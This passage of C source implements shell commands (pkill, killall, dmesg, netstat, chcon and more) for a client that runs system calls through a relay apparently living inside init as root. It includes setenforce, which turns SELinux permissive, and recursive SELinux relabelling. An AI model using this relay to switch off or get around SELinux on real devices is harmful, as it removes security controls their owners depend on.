/* pkill helpers: comma-list matching and terminal device resolution */
static int pkill_in_num_list(const char *list, long val) {
    const char *p = list;
    while (*p) {
        char *end;
        long v = strtol(p, &end, 10);
        if (end != p && v == val) return 1;
        p = (*end == ',') ? end + 1 : end;
        if (p == end) break;
    }
    return 0;
}

static long pkill_term_to_dev(const char *name) {
    int major, minor;
    if (strncmp(name, "pts/", 4) == 0) { major = 136; minor = atoi(name + 4); }
    else if (strncmp(name, "tty", 3) == 0 && name[3] >= '0' && name[3] <= '9') {
        major = 4; minor = atoi(name + 3);
    } else {
        char *end;
        long v = strtol(name, &end, 10);
        if (*end == '\0' && end != name) { major = 136; minor = (int)v; }
        else return -1;
    }
    /* new_encode_dev: (minor & 0xff) | (major << 8) | ((minor & ~0xff) << 12) */
    return (minor & 0xff) | (major << 8) | ((minor & ~(long)0xff) << 12);
}

static int pkill_match_term_list(const char *list, long tty_nr) {
    const char *p = list;
    while (*p) {
        const char *end = p;
        while (*end && *end != ',') end++;
        char term[64];
        size_t len = (size_t)(end - p);
        if (len >= sizeof(term)) len = sizeof(term) - 1;
        memcpy(term, p, len);
        term[len] = '\0';
        if (pkill_term_to_dev(term) == tty_nr) return 1;
        p = (*end == ',') ? end + 1 : end;
    }
    return 0;
}

static int cmd_killall(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "killall: Usage: killall [-<sig>] <name>\n");
        return 1;
    }

    int sig = 15;
    const char *name = NULL;

    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') {
            char *endp;
            long val = strtol(argv[i] + 1, &endp, 10);
            if (*endp == '\0' && val > 0) {
                sig = (int)val;
            } else {
                int s = signal_by_name(argv[i] + 1);
                if (s > 0) sig = s;
            }
        } else {
            name = argv[i];
        }
    }

    if (!name) { fprintf(stderr, "killall: missing process name\n"); return 1; }

    int64_t fd = relay_openat(sock, "/proc", MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (fd < 0) { fprintf(stderr, "killall: cannot open /proc\n"); return 1; }

    int killed = 0;
    uint8_t buf[DATA_SIZE];
    int64_t nbytes;
    /* H3: Loop getdents64 until 0 to see all processes */
    while ((nbytes = relay_getdents64(sock, fd, buf, DATA_SIZE)) > 0) {
        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            const char *d_name = (const char *)(buf + pos + 19);
            if (d_reclen == 0) break;

            int is_pid = 1;
            for (const char *p = d_name; *p; p++)
                if (*p < '0' || *p > '9') { is_pid = 0; break; }

            if (is_pid && d_name[0] && proc_match_name(sock, d_name, name)) {
                int pid = atoi(d_name);
                /* SAFETY: never signal PID 1 (init) — the relay runs inside init */
                if (pid == 1) {
                    fprintf(stderr, "killall: skipping PID 1 (init) — would kill relay\n");
                    pos += d_reclen;
                    continue;
                }
                int64_t ret = relay_kill(sock, pid, sig);
                if (ret >= 0) { printf("Killed %s (pid %d)\n", name, pid); killed++; }
            }
            pos += d_reclen;
        }
    }
    relay_close(sock, fd);

    if (!killed) fprintf(stderr, "killall: %s: no process found\n", name);
    return killed ? 0 : 1;
}

static int cmd_pidof(int sock, int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "pidof: Usage: pidof <name>\n"); return 1; }

    const char *name = argv[1];

    int64_t fd = relay_openat(sock, "/proc", MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (fd < 0) return 1;

    int found = 0;
    uint8_t buf[DATA_SIZE];
    int64_t nbytes;
    /* H3: Loop getdents64 until 0 to see all processes */
    while ((nbytes = relay_getdents64(sock, fd, buf, DATA_SIZE)) > 0) {
        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            const char *d_name = (const char *)(buf + pos + 19);
            if (d_reclen == 0) break;

            int is_pid = 1;
            for (const char *p = d_name; *p; p++)
                if (*p < '0' || *p > '9') { is_pid = 0; break; }

            if (is_pid && d_name[0] && proc_match_name(sock, d_name, name)) {
                if (found) putchar(' ');
                printf("%s", d_name);
                found++;
            }
            pos += d_reclen;
        }
    }
    relay_close(sock, fd);

    if (found) putchar('\n');
    else fprintf(stderr, "pidof: %s: not found\n", name);
    return found ? 0 : 1;
}

static int cmd_pgrep(int sock, int argc, char *argv[]) {
    /* Same as pidof but prints each on own line */
    if (argc < 2) { fprintf(stderr, "pgrep: Usage: pgrep <pattern>\n"); return 1; }

    const char *pattern = argv[1];

    int64_t fd = relay_openat(sock, "/proc", MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (fd < 0) return 1;

    int found = 0;
    uint8_t buf[DATA_SIZE];
    int64_t nbytes;
    /* H3: Loop getdents64 until 0 to see all processes */
    while ((nbytes = relay_getdents64(sock, fd, buf, DATA_SIZE)) > 0) {
        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            const char *d_name = (const char *)(buf + pos + 19);
            if (d_reclen == 0) break;

            int is_pid = 1;
            for (const char *p = d_name; *p; p++)
                if (*p < '0' || *p > '9') { is_pid = 0; break; }

            if (is_pid && d_name[0] && proc_match_name(sock, d_name, pattern)) {
                printf("%s\n", d_name);
                found++;
            }
            pos += d_reclen;
        }
    }
    relay_close(sock, fd);

    return found ? 0 : 1;
}

static int cmd_pkill(int sock, int argc, char *argv[]) {
    int sig = 15;
    int verbose = 0, full_cmd = 0, newest = 0, oldest = 0;
    int negate = 0, exact_match = 0;
    const char *pattern = NULL;
    const char *opt_G = NULL, *opt_g = NULL, *opt_P = NULL;
    const char *opt_s = NULL, *opt_t = NULL, *opt_U = NULL, *opt_u = NULL;

    for (int i = 1; i < argc; i++) {
        if (argv[i][0] != '-' || argv[i][1] == '\0') {
            if (pattern) {
                fprintf(stderr, "pkill: only one pattern allowed\n");
                return 1;
            }
            pattern = argv[i];
            continue;
        }

        char *endp;
        long val = strtol(argv[i] + 1, &endp, 10);
        if (*endp == '\0' && val >= 0 && val < 64) { sig = (int)val; continue; }

        int all_upper = 1;
        for (const char *c = argv[i] + 1; *c; c++)
            if (!(*c >= 'A' && *c <= 'Z')) { all_upper = 0; break; }
        if (all_upper && strlen(argv[i] + 1) >= 2) {
            int s = signal_by_name(argv[i] + 1);
            if (s > 0) { sig = s; continue; }
        }

        const char *f = argv[i] + 1;
        int done = 0;
        while (*f && !done) {
            switch (*f) {
            case 'V': verbose = 1; f++; break;
            case 'f': full_cmd = 1; f++; break;
            case 'n': newest = 1; f++; break;
            case 'o': oldest = 1; f++; break;
            case 'v': negate = 1; f++; break;
            case 'x': exact_match = 1; f++; break;
            case 'l': {
                f++;
                const char *sigarg = NULL;
                if (*f) sigarg = f;
                else if (i + 1 < argc) sigarg = argv[++i];
                if (!sigarg) {
                    fprintf(stderr, "pkill: -l requires a signal argument\n");
                    return 1;
                }
                {
                    int ls = signal_by_name(sigarg);
                    if (ls > 0) sig = ls;
                    else {
                        long lv = strtol(sigarg, &endp, 10);
                        if (*endp == '\0' && lv > 0) sig = (int)lv;
                        else {
                            fprintf(stderr, "pkill: unknown signal '%s'\n", sigarg);
                            return 1;
                        }
                    }
                }
                done = 1; break;
            }
            case 'G': f++; if (*f) opt_G = f; else if (i+1<argc) opt_G = argv[++i]; done = 1; break;
            case 'g': f++; if (*f) opt_g = f; else if (i+1<argc) opt_g = argv[++i]; done = 1; break;
            case 'P': f++; if (*f) opt_P = f; else if (i+1<argc) opt_P = argv[++i]; done = 1; break;
            case 's': f++; if (*f) opt_s = f; else if (i+1<argc) opt_s = argv[++i]; done = 1; break;
            case 't': f++; if (*f) opt_t = f; else if (i+1<argc) opt_t = argv[++i]; done = 1; break;
            case 'U': f++; if (*f) opt_U = f; else if (i+1<argc) opt_U = argv[++i]; done = 1; break;
            case 'u': f++; if (*f) opt_u = f; else if (i+1<argc) opt_u = argv[++i]; done = 1; break;
            default:
                fprintf(stderr, "pkill: unknown option '-%c'\n", *f);
                return 1;
            }
        }
    }

    if (newest && oldest) {
        fprintf(stderr, "pkill: -n and -o are mutually exclusive\n");
        return 1;
    }

    if (!pattern && !opt_G && !opt_g && !opt_P && !opt_s && !opt_t && !opt_U && !opt_u) {
        fprintf(stderr, "Usage: pkill [-fnovx] [-SIGNAL|-l SIGNAL] [PATTERN] "
                "[-G GID,] [-g PGRP,] [-P PPID,] [-s SID,] [-t TERM,] [-U UID,] [-u EUID,]\n");
        return 1;
    }

    int64_t dfd = relay_openat(sock, "/proc", MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (dfd < 0) { fprintf(stderr, "pkill: cannot open /proc\n"); return 1; }

    int best_pid = -1;
    unsigned long long best_starttime = 0;
    int signaled = 0;

    uint8_t dbuf[DATA_SIZE];
    int64_t nbytes;

    while ((nbytes = relay_getdents64(sock, dfd, dbuf, DATA_SIZE)) > 0) {
        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            uint16_t d_reclen = unpack_u32(dbuf + pos + 16) & 0xFFFF;
            const char *d_name = (const char *)(dbuf + pos + 19);
            if (d_reclen == 0) break;

            int is_pid = 1;
            for (const char *p = d_name; *p; p++)
                if (*p < '0' || *p > '9') { is_pid = 0; break; }
            if (!is_pid || d_name[0] == '\0') { pos += d_reclen; continue; }

            int pid = atoi(d_name);
            if (pid == 1) { pos += d_reclen; continue; }
            if (pid == getpid()) { pos += d_reclen; continue; }

            char path[128];
            snprintf(path, sizeof(path), "/proc/%s/stat", d_name);
            int64_t stfd = relay_openat(sock, path, MY_O_RDONLY, 0);
            if (stfd < 0) { pos += d_reclen; continue; }

            char comm[64] = "";
            long ppid_val = 0, pgrp_val = 0, session_val = 0, tty_nr_val = 0;
            unsigned long long starttime_val = 0;

            uint8_t stbuf[512];
            memset(stbuf, 0, sizeof(stbuf));
            int64_t stn = relay_read(sock, stfd, stbuf, sizeof(stbuf) - 1);
            relay_close(sock, stfd);

            if (stn > 0) {
                stbuf[stn] = '\0';
                char *sp = (char *)stbuf;
                while (*sp && *sp != '(') sp++;
                if (*sp == '(') {
                    sp++;
                    char *ce = strrchr(sp, ')');
                    if (ce) {
                        size_t clen = (size_t)(ce - sp);
                        if (clen >= sizeof(comm)) clen = sizeof(comm) - 1;
                        memcpy(comm, sp, clen);
                        comm[clen] = '\0';
                        sp = ce + 1;
                    }
                }
                int fnum = 3;
                while (*sp && fnum <= 22) {
                    while (*sp == ' ') sp++;
                    if (*sp == '\0') break;
                    char *fstart = sp;
                    while (*sp && *sp != ' ') sp++;
                    char sv = *sp; *sp = '\0';
                    if (fnum == 4) ppid_val = strtol(fstart, NULL, 10);
                    else if (fnum == 5) pgrp_val = strtol(fstart, NULL, 10);
                    else if (fnum == 6) session_val = strtol(fstart, NULL, 10);
                    else if (fnum == 7) tty_nr_val = strtol(fstart, NULL, 10);
                    else if (fnum == 22) starttime_val = strtoull(fstart, NULL, 10);
                    *sp = sv;
                    fnum++;
                }
            }

            char cmdline[512] = "";
            if (full_cmd) {
                snprintf(path, sizeof(path), "/proc/%s/cmdline", d_name);
                int64_t cfd = relay_openat(sock, path, MY_O_RDONLY, 0);
                if (cfd >= 0) {
                    uint8_t cbuf[512];
                    memset(cbuf, 0, sizeof(cbuf));
                    int64_t cn = relay_read(sock, cfd, cbuf, sizeof(cbuf) - 1);
                    relay_close(sock, cfd);
                    if (cn > 0) {
                        for (int j = 0; j < cn - 1; j++)
                            if (cbuf[j] == '\0') cbuf[j] = ' ';
                        cbuf[cn] = '\0';
                        strncpy(cmdline, (char *)cbuf, sizeof(cmdline) - 1);
                    }
                }
            }

            long uid_real = -1, uid_eff = -1, gid_real = -1;
            if (opt_U || opt_u || opt_G) {
                snprintf(path, sizeof(path), "/proc/%s/status", d_name);
                int64_t sfd = relay_openat(sock, path, MY_O_RDONLY, 0);
                if (sfd >= 0) {
                    uint8_t sbuf[2048];
                    memset(sbuf, 0, sizeof(sbuf));
                    int64_t ssn = relay_read(sock, sfd, sbuf, sizeof(sbuf) - 1);
                    relay_close(sock, sfd);
                    if (ssn > 0) {
                        sbuf[ssn] = '\0';
                        char *ul = strstr((char *)sbuf, "Uid:");
                        if (ul) {
                            ul += 4;
                            while (*ul == '\t' || *ul == ' ') ul++;
                            char *up = ul;
                            uid_real = strtol(up, &up, 10);
                            while (*up == '\t' || *up == ' ') up++;
                            uid_eff = strtol(up, NULL, 10);
                        }
                        char *gl = strstr((char *)sbuf, "Gid:");
                        if (gl) {
                            gl += 4;
                            while (*gl == '\t' || *gl == ' ') gl++;
                            gid_real = strtol(gl, NULL, 10);
                        }
                    }
                }
            }

            int name_match = 1;
            if (pattern) {
                const char *match_str = full_cmd ? (cmdline[0] ? cmdline : comm) : comm;
                name_match = exact_match ? (strcmp(match_str, pattern) == 0)
                                         : (strstr(match_str, pattern) != NULL);
            }

            int filter_match = 1;
            if (opt_G && !pkill_in_num_list(opt_G, gid_real)) filter_match = 0;
            if (opt_g && !pkill_in_num_list(opt_g, pgrp_val)) filter_match = 0;
            if (opt_P && !pkill_in_num_list(opt_P, ppid_val)) filter_match = 0;
            if (opt_s && !pkill_in_num_list(opt_s, session_val)) filter_match = 0;
            if (opt_t && !pkill_match_term_list(opt_t, tty_nr_val)) filter_match = 0;
            if (opt_U && !pkill_in_num_list(opt_U, uid_real)) filter_match = 0;
            if (opt_u && !pkill_in_num_list(opt_u, uid_eff)) filter_match = 0;

            int matched = name_match && filter_match;
            if (negate) matched = !matched;

            if (matched) {
                if (newest || oldest) {
                    if (best_pid < 0 ||
                        (newest && starttime_val > best_starttime) ||
                        (oldest && starttime_val < best_starttime)) {
                        best_pid = pid;
                        best_starttime = starttime_val;
                    }
                } else {
                    int64_t ret = relay_kill(sock, pid, sig);
                    if (ret >= 0) {
                        signaled++;
                        if (verbose) printf("pkill: killed %d (%s)\n", pid, comm);
                    } else if (verbose) {
                        fprintf(stderr, "pkill: kill(%d): %s\n", pid, errno_str((int)(-ret)));
                    }
                }
            }

            pos += d_reclen;
        }
    }
    relay_close(sock, dfd);

    if ((newest || oldest) && best_pid > 0) {
        int64_t ret = relay_kill(sock, best_pid, sig);
        if (ret >= 0) {
            signaled++;
            if (verbose) printf("pkill: killed %d\n", best_pid);
        } else if (verbose) {
            fprintf(stderr, "pkill: kill(%d): %s\n", best_pid, errno_str((int)(-ret)));
        }
    }

    if (!signaled) {
        if (verbose) fprintf(stderr, "pkill: no matching processes\n");
        return 1;
    }
    return 0;
}

static int cmd_uptime(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    uint8_t *data;
    ssize_t sz = relay_read_file(sock, "/proc/uptime", &data, 1024);
    if (sz < 0) {
        fprintf(stderr, "uptime: cannot read /proc/uptime\n");
        return 1;
    }
    data[sz] = '\0';

    double uptime = 0;
    sscanf((char *)data, "%lf", &uptime);
    free(data);

    int days = (int)(uptime / 86400);
    int hours = (int)((uptime - days * 86400) / 3600);
    int mins = (int)((uptime - days * 86400 - hours * 3600) / 60);

    printf("up ");
    if (days > 0) printf("%d day%s, ", days, days > 1 ? "s" : "");
    printf("%d:%02d\n", hours, mins);
    return 0;
}

static int cmd_free(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    relay_cat_file(sock, "/proc/meminfo");
    return 0;
}

static int cmd_uname(int sock, int argc, char *argv[]) {
    int show_all = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-a") == 0) show_all = 1;
    }

    /* Read from /proc files since uname syscall needs struct in data area */
    uint8_t *hostname_data;
    ssize_t hn_sz = relay_read_file(sock, "/proc/sys/kernel/hostname", &hostname_data, 256);
    char hostname[128] = "unknown";
    if (hn_sz > 0) {
        if ((size_t)hn_sz >= sizeof(hostname)) hn_sz = sizeof(hostname) - 1;
        memcpy(hostname, hostname_data, (size_t)hn_sz);
        hostname[hn_sz] = '\0';
        if (hn_sz > 0 && hostname[hn_sz-1] == '\n') hostname[hn_sz-1] = '\0';
        free(hostname_data);
    }

    uint8_t *ver_data;
    ssize_t ver_sz = relay_read_file(sock, "/proc/version", &ver_data, 512);
    char version[256] = "Linux";
    if (ver_sz > 0) {
        if ((size_t)ver_sz >= sizeof(version)) ver_sz = sizeof(version) - 1;
        memcpy(version, ver_data, (size_t)ver_sz);
        version[ver_sz] = '\0';
        if (ver_sz > 0 && version[ver_sz-1] == '\n') version[ver_sz-1] = '\0';
        free(ver_data);
    }

    if (show_all) {
        printf("%s\n", version);
    } else {
        /* Print just sysname + hostname */
        printf("Linux %s\n", hostname);
    }
    return 0;
}

static int cmd_hostname(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    uint8_t *data;
    ssize_t sz = relay_read_file(sock, "/proc/sys/kernel/hostname", &data, 256);
    if (sz <= 0) { fprintf(stderr, "hostname: cannot read\n"); return 1; }
    data[sz] = '\0';
    if (sz > 0 && data[sz-1] == '\n') data[sz-1] = '\0';
    printf("%s\n", (char *)data);
    free(data);
    return 0;
}

static int cmd_dmesg(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    /* Try /proc/kmsg first (needs root, which init has) */
    int64_t fd = relay_openat(sock, "/dev/kmsg", MY_O_RDONLY, 0);
    if (fd < 0) {
        /* Fallback: try syslog via /proc */
        int e = relay_cat_file(sock, "/proc/kmsg");
        if (e) fprintf(stderr, "dmesg: cannot read kernel log\n");
        return e;
    }

    /* /dev/kmsg is a stream — read with timeout, stop after no data */
    for (int rounds = 0; rounds < 100; rounds++) {
        if (g_sigint) { g_sigint = 0; break; }
        uint8_t buf[DATA_SIZE];
        int64_t n = relay_read(sock, fd, buf, DATA_SIZE);
        if (n <= 0) break;
        fwrite(buf, 1, (size_t)n, stdout);
        if ((size_t)n < DATA_SIZE) break;
    }

    relay_close(sock, fd);
    fflush(stdout);
    return 0;
}

static int cmd_date(int sock, int argc, char *argv[]) {
    (void)sock; (void)argc; (void)argv;
    /* Use local time (client-side) since clock_gettime via relay is complex */
    time_t now = time(NULL);
    struct tm *tm = localtime(&now);
    char buf[64];
    strftime(buf, sizeof(buf), "%a %b %e %H:%M:%S %Z %Y", tm);
    printf("%s\n", buf);
    return 0;
}

static int cmd_sleep_cmd(int sock, int argc, char *argv[]) {
    (void)sock;
    if (argc < 2) { fprintf(stderr, "sleep: missing operand\n"); return 1; }

    double secs = atof(argv[1]);
    if (secs <= 0) { fprintf(stderr, "sleep: invalid time: %s\n", argv[1]); return 1; }

    /* Sleep locally */
    unsigned int whole = (unsigned int)secs;
    if (whole > 0) sleep(whole);
    usleep((unsigned int)((secs - whole) * 1000000));
    return 0;
}

static int cmd_nproc(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    uint8_t *data;
    ssize_t sz = relay_read_file(sock, "/proc/cpuinfo", &data, 0);
    if (sz < 0) { fprintf(stderr, "nproc: cannot read /proc/cpuinfo\n"); return 1; }

    int count = 0;
    ssize_t line_start = 0;
    for (ssize_t j = 0; j <= sz; j++) {
        if (j == sz || data[j] == '\n') {
            if (j - line_start > 9 && memcmp(data + line_start, "processor", 9) == 0) {
                count++;
            }
            line_start = j + 1;
        }
    }

    printf("%d\n", count);
    free(data);
    return 0;
}

static int cmd_printenv(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    /* Read relay child's environ */
    uint8_t *data;
    ssize_t sz = relay_read_file(sock, "/proc/self/environ", &data, 0);
    if (sz < 0) {
        fprintf(stderr, "printenv: cannot read /proc/self/environ\n");
        return 1;
    }

    /* NUL-separated entries */
    for (ssize_t i = 0; i < sz; i++) {
        if (data[i] == '\0') putchar('\n');
        else putchar(data[i]);
    }
    if (sz > 0 && data[sz-1] != '\0') putchar('\n');

    free(data);
    return 0;
}


/* ═══════════════════════════════════════════════════════════════════════════
 * NEW COMMANDS — SELinux
 * ═══════════════════════════════════════════════════════════════════════════ */

static int cmd_getenforce(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    uint8_t *data;
    ssize_t sz = relay_read_file(sock, "/sys/fs/selinux/enforce", &data, 16);
    if (sz < 0) {
        fprintf(stderr, "getenforce: cannot read SELinux state\n");
        return 1;
    }
    data[sz] = '\0';
    int val = atoi((char *)data);
    printf("%s\n", val ? "Enforcing" : "Permissive");
    free(data);
    return 0;
}

static int cmd_setenforce(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "setenforce: Usage: setenforce <0|1|Permissive|Enforcing>\n");
        return 1;
    }

    const char *val = argv[1];
    char byte = '0';
    if (strcmp(val, "1") == 0 || strcasecmp(val, "enforcing") == 0) byte = '1';

    int64_t fd = relay_openat(sock, "/sys/fs/selinux/enforce", MY_O_WRONLY, 0);
    if (fd < 0) {
        fprintf(stderr, "setenforce: cannot open enforce file: %s\n", errno_str((int)(-fd)));
        return 1;
    }

    int64_t ret = relay_write(sock, fd, &byte, 1);
    relay_close(sock, fd);

    if (ret < 0) {
        fprintf(stderr, "setenforce: write failed: %s\n", errno_str((int)(-ret)));
        return 1;
    }
    return 0;
}

/* chcon_one — set SELinux context on a single path (any file type).
 * Returns 0 on success, -1 on error (prints diagnostic). */
static int chcon_one(int sock, const char *abspath, const char *context) {
    size_t plen = strlen(abspath) + 1;
    size_t p_padded = (plen + 7) & ~(size_t)7;
    const char *xattr_name = "security.selinux";
    size_t nlen = strlen(xattr_name) + 1;
    size_t n_padded = (nlen + 7) & ~(size_t)7;
    size_t vlen = strlen(context) + 1; /* include NUL for selinux */

    if (p_padded + n_padded + vlen > DATA_SIZE) {
        fprintf(stderr, "chcon: path too long: '%s'\n", abspath);
        return -1;
    }

    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, abspath, plen);
    memcpy(dbuf + p_padded, xattr_name, nlen);
    memcpy(dbuf + p_padded + n_padded, context, vlen);

    /* lsetxattr: x0=path, x1=name, x2=value, x3=size, x4=flags(0) */
    int64_t ret = send_syscall(sock, SYS_lsetxattr,
                               0, (uint64_t)p_padded, (uint64_t)(p_padded + n_padded),
                               (uint64_t)vlen, 0, 0,
                               FLAG_X0_DATA | FLAG_X1_DATA | FLAG_X2_DATA,
                               dbuf, p_padded + n_padded + vlen,
                               NULL, 0);

    if (ret < 0) {
        fprintf(stderr, "chcon: setting context on '%s': %s\n",
                abspath, errno_str((int)(-ret)));
        return -1;
    }
    return 0;
}

/* chcon_recursive — relabel path AND all contents recursively.
 * Relabels the path itself first, then if it is a directory, enumerates
 * children via getdents64 and recurses into subdirectories. */
static void chcon_recursive(int sock, const char *abspath, const char *context) {
    /* Relabel this entry (works for any file type) */
    chcon_one(sock, abspath, context);

    /* If it is a directory, enumerate and recurse */
    int64_t fd = relay_openat(sock, abspath, MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (fd < 0) return; /* not a directory or inaccessible — already relabeled above */

    for (;;) {
        uint8_t buf[DATA_SIZE];
        int64_t nbytes = relay_getdents64(sock, fd, buf, DATA_SIZE);
        if (nbytes <= 0) break;

        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            if (g_sigint) { relay_close(sock, fd); return; }
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            uint8_t d_type = buf[pos + 18];
            const char *d_name = (const char *)(buf + pos + 19);

            if (d_reclen == 0) { nbytes = 0; break; }

            if (strcmp(d_name, ".") != 0 && strcmp(d_name, "..") != 0) {
                char child[CWD_SIZE];
                snprintf(child, CWD_SIZE, "%s/%s", abspath, d_name);

                if (d_type == DT_DIR) {
                    chcon_recursive(sock, child, context);
                } else {
                    chcon_one(sock, child, context);
                }
            }
            pos += d_reclen;
        }
    }
    relay_close(sock, fd);
}

static int cmd_chcon(int sock, int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "chcon: Usage: chcon [-R] <context> <path>\n");
        return 1;
    }

    int recursive = 0;
    const char *context = NULL;
    const char *path_arg = NULL;

    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') {
            for (const char *f = argv[i] + 1; *f; f++) {
                if (*f == 'R' || *f == 'r') recursive = 1;
            }
        } else if (!context) {
            context = argv[i];
        } else {
            path_arg = argv[i];
        }
    }

    if (!context || !path_arg) {
        fprintf(stderr, "chcon: Usage: chcon [-R] <context> <path>\n");
        return 1;
    }

    char abs[CWD_SIZE];
    resolve_path(path_arg, abs);

    if (recursive) {
        chcon_recursive(sock, abs, context);
    } else {
        if (chcon_one(sock, abs, context) < 0) return 1;
    }
    return 0;
}

static int cmd_getcon(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    relay_cat_file(sock, "/proc/self/attr/current");
    putchar('\n');
    return 0;
}


/* ═══════════════════════════════════════════════════════════════════════════
 * NEW COMMANDS — Network
 * ═══════════════════════════════════════════════════════════════════════════ */

static int cmd_netstat(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    printf("=== TCP ===\n");
    relay_cat_file(sock, "/proc/net/tcp");
    printf("\n=== TCP6 ===\n");
    relay_cat_file(sock, "/proc/net/tcp6");
    printf("\n=== UDP ===\n");
    relay_cat_file(sock, "/proc/net/udp");
    printf("\n=== UNIX ===\n");
    relay_cat_file(sock, "/proc/net/unix");
    return 0;
}

static int cmd_ifconfig(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    /* List interfaces from /sys/class/net/ */
    int64_t fd = relay_openat(sock, "/sys/class/net", MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (fd < 0) {
        fprintf(stderr, "ifconfig: cannot list interfaces\n");
        return 1;
    }

    uint8_t buf[DATA_SIZE];
    int64_t nbytes = relay_getdents64(sock, fd, buf, DATA_SIZE);
    relay_close(sock, fd);
    if (nbytes <= 0) return 0;

    size_t pos = 0;
    while (pos < (size_t)nbytes) {
        uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
        const char *d_name = (const char *)(buf + pos + 19);
        if (d_reclen == 0) break;

        if (d_name[0] != '.') {
            printf("%s: ", d_name);

            /* Read address */
            char addr_path[256];
            snprintf(addr_path, sizeof(addr_path), "/sys/class/net/%s/address", d_name);
            uint8_t *addr_data;
            ssize_t asz = relay_read_file(sock, addr_path, &addr_data, 64);
            if (asz > 0) {
                addr_data[asz] = '\0';
                if (asz > 0 && addr_data[asz-1] == '\n') addr_data[asz-1] = '\0';
                printf("HWaddr %s ", (char *)addr_data);
                free(addr_data);
            }

            /* Read MTU */
            char mtu_path[256];
            snprintf(mtu_path, sizeof(mtu_path), "/sys/class/net/%s/mtu", d_name);
            uint8_t *mtu_data;
            ssize_t msz = relay_read_file(sock, mtu_path, &mtu_data, 16);
            if (msz > 0) {
                mtu_data[msz] = '\0';
                if (msz > 0 && mtu_data[msz-1] == '\n') mtu_data[msz-1] = '\0';
                printf("MTU %s", (char *)mtu_data);
                free(mtu_data);
            }

            printf("\n");
        }
        pos += d_reclen;
    }
    return 0;
}


/* ═══════════════════════════════════════════════════════════════════════════
 * NEW COMMANDS — Permissions/Users
 * ═══════════════════════════════════════════════════════════════════════════ */

static int cmd_groups(int sock, int argc, char *argv[]) {
    (void)argc; (void)argv;
    uint8_t *data;
    ssize_t sz = relay_read_file(sock, "/proc/self/status", &data, 4096);
    if (sz < 0) { fprintf(stderr, "groups: cannot read status\n"); return 1; }
    data[sz] = '\0';

    char *groups = strstr((char *)data, "Groups:");
    if (groups) {
        groups += 7;
        char *end = strchr(groups, '\n');
        if (end) *end = '\0';
        printf("%s\n", groups);
    } else {
        printf("0\n");
    }
    free(data);
    return 0;
}

static int cmd_logname(int sock, int argc, char *argv[]) {
    (void)sock; (void)argc; (void)argv;
    printf("root\n");
    return 0;
}


/* ═══════════════════════════════════════════════════════════════════════════
 * NEW COMMANDS — Misc
 * ═══════════════════════════════════════════════════════════════════════════ */

static int cmd_yes(int sock, int argc, char *argv[]) {
    (void)sock;
    const char *str = "y";
    if (argc >= 2) str = argv[1];

    while (!g_sigint) {
        printf("%s\n", str);
    }
    g_sigint = 0;
    return 0;
}

static int cmd_true(int sock, int argc, char *argv[]) {
    (void)sock; (void)argc; (void)argv;
    return 0;
}

static int cmd_false(int sock, int argc, char *argv[]) {
    (void)sock; (void)argc; (void)argv;
    return 1;
}

static int cmd_seq(int sock, int argc, char *argv[]) {
    (void)sock;
    if (argc < 2) { fprintf(stderr, "seq: Usage: seq [start [step]] end\n"); return 1; }

    double start = 1, step = 1, end_val = 1;

    if (argc == 2) {
        end_val = atof(argv[1]);
    } else if (argc == 3) {
        start = atof(argv[1]);
        end_val = atof(argv[2]);
    } else {
        start = atof(argv[1]);
        step = atof(argv[2]);
        end_val = atof(argv[3]);
    }

    if (step == 0) { fprintf(stderr, "seq: zero step\n"); return 1; }

    if (step > 0) {
        for (double v = start; v <= end_val && !g_sigint; v += step)
            printf("%.0f\n", v);
    } else {
        for (double v = start; v >= end_val && !g_sigint; v += step)
            printf("%.0f\n", v);
    }
    g_sigint = 0;
    return 0;
}

static int cmd_printf_cmd(int sock, int argc, char *argv[]) {
    (void)sock;
    if (argc < 2) { fprintf(stderr, "printf: missing format string\n"); return 1; }

    /* Very basic printf: just string substitution of %s, %d */
    const char *fmt = argv[1];
    int argi = 2;

    for (const char *p = fmt; *p; p++) {
        if (*p == '\\') {
            p++;
            if (*p == 'n') putchar('\n');
            else if (*p == 't') putchar('\t');
            else if (*p == '\\') putchar('\\');
            else { putchar('\\'); putchar(*p); }
        } else if (*p == '%' && *(p+1)) {
            p++;
            if (*p == 's') {
                if (argi < argc) printf("%s", argv[argi++]);
            } else if (*p == 'd') {
                if (argi < argc) printf("%d", atoi(argv[argi++]));
            } else if (*p == '%') {
                putchar('%');
            } else {
                putchar('%'); putchar(*p);
            }
        } else {
            putchar(*p);
        }
    }
    fflush(stdout);
    return 0;
}

static int cmd_test(int sock, int argc, char *argv[]) {
    /* Basic test/[ implementation */
